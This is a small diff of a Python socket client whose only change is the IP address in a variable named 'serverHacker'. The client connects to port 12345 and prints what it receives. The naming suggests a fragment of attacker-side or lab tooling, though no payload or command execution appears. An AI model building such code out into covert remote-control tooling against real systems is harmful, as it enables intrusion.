@@ -3,7 +3,7 @@ import socket
 
 clientSocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
 
-serverHacker = '192.168.1.3'
+serverHacker = '192.168.1.22'
 serverPort = 12345
 clientSocket.connect((serverHacker, serverPort))
 print (clientSocket.recv(1024).decode())
